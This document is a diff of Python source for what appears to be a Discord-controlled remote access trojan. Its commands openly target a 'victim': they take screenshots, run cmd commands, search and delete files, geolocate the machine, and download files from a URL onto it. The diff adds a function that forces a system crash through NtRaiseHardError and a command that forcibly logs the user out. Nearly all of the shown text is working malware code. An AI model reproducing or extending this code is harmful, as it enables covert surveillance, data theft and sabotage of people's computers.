@@ -1,3 +1,5 @@
+import ctypes
+import ctypes.wintypes
 import json
 import os
 import os.path
@@ -53,11 +55,11 @@ async def on_ready():
 		if ping_on_startup:
 			try:
 				await channel.send(f"@everyone `{username}` started `{__file__}`")
-			except Exception as e:
+			except:
 				pass
 
 
-def download(url: str, directory: str, filename: str):
+def filedownload(url: str, directory: str, filename: str):
 	loc = directory + "\\" + filename
 	try:
 		output = urllib.request.urlretrieve(url, loc)
@@ -93,7 +95,7 @@ def transfer(filelocation: str):
 def doScreenshot():
 	name = time.strftime("%Y%m%d-%H%M%S.jpg")
 	path = join(os.getenv("TEMP"), name)
-	img = pyautogui.screenshot(path)
+	pyautogui.screenshot(path)
 	return name, path
 
 
@@ -156,7 +158,6 @@ def systemInfo():
 
 
 def searchFile(directory: str, keyword: str):
-	output = ""
 	directory = directory.casefold().replace("%user%", os.getenv("USERNAME"))
 	directory = directory.casefold().replace("%username%", os.getenv("USERNAME"))
 	if exists(directory):
@@ -170,7 +171,7 @@ def searchFile(directory: str, keyword: str):
 			for file in found_files:
 				output += f" -> `{file}`\n"
 		else:
-			output = f"File not found"
+			output = f"No File mayching Keyword `{keyword} in {directory} found"
 		return output
 	else:
 		output = f"Directory `{directory}` not found"
@@ -180,9 +181,28 @@ def searchFile(directory: str, keyword: str):
 def geolocate():
 	with urllib.request.urlopen("https://geolocation-db.com/json") as url:
 		data = json.loads(url.read().decode())
-		link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
+		link = f"https://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
 		link = f" successfully got Google Maps Coordinates: {link}"
 		return link
+
+
+def crash():
+	ntdll = ctypes.windll.ntdll
+	prev_value = ctypes.c_bool()
+	res = ctypes.c_ulong()
+	ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
+
+	if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
+		output = "Successfully crashed machine"
+	else:
+		output = "Failed to crash machine"
+	return output
+
+@bot.tree.command(name="crash",
+                  description="crash your victim's computer")
+async def geo(interaction: discord.Interaction):
+	await interaction.response.send_message(f"crashing machine...")
+	await interaction.channel.send(crash())
 
 
 @bot.tree.command(name="cmd", description="execute command in cmd")
@@ -218,6 +238,7 @@ async def typing(interaction: discord.Interaction, message: str):
 async def tasklist(interaction: discord.Interaction):
 	await interaction.response.send_message(f"listing all tasks...")
 	await interaction.channel.send(file=discord.File(getTasklist()))
+	os.remove(getTasklist())
 
 
 @bot.tree.command(name="geolocate",
@@ -228,12 +249,14 @@ async def geo(interaction: discord.Interaction):
 
 
 @bot.tree.command(name="systeminfo",
-                  description="attemt to get system info")
+                  description="attempt to get system info")
 async def sysinfo(interaction: discord.Interaction):
 	await interaction.response.send_message(f"getting system info...")
 	systempath, envpath = systemInfo()
 	await interaction.channel.send(file=discord.File(systempath))
 	await interaction.channel.send(file=discord.File(envpath))
+	os.remove(systempath)
+	os.remove(envpath)
 
 
 @bot.tree.command(name="screenshot", description="get a screenshot of the victim")
@@ -241,7 +264,6 @@ async def scr(interaction: discord.Interaction):
 	name, path = doScreenshot()
 	await interaction.response.send_message(f"Screenshot taken, sending...")
 	await interaction.channel.send(file=discord.File(path))
-	print(path)
 	os.remove(path)
 
 
@@ -259,17 +281,23 @@ async def search(interaction: discord.Interaction, location: str, keyword: str):
 	await interaction.channel.send(searchFile(location, keyword))
 
 
-@bot.tree.command(name="delete", description="delete a file of the victim (use %user% instead of username)")
-async def delete(interaction: discord.Interaction, locinput: str):
+@bot.tree.command(name="delete_file", description="delete a file of the victim (use %user% instead of username)")
+async def deleteFile(interaction: discord.Interaction, locinput: str):
 	await interaction.response.send_message(f"searching for `{locinput}`...")
 	await interaction.channel.send(delete(locinput))
 
 
 @bot.tree.command(name="download",
                   description="download a file on the machine of the victim (needs to be raw [eg. github raw))")
-async def download(interaction: discord.Interaction, targeturl: str, directory: str, filename: str):
+async def downloadFile(interaction: discord.Interaction, targeturl: str, directory: str, filename: str):
 	await interaction.response.send_message(f"searching for `{targeturl}`...")
-	await interaction.channel.send(download(targeturl, directory, filename))
+	await interaction.channel.send(filedownload(targeturl, directory, filename))
+
+
+@bot.tree.command(name="log_out", description="log the victim out of their User account")
+async def scr(interaction: discord.Interaction):
+	os.system("shutdown /l /f")
+	await interaction.response.send_message(f"Successfully logged out")
 
 
 bot.run(token=token)
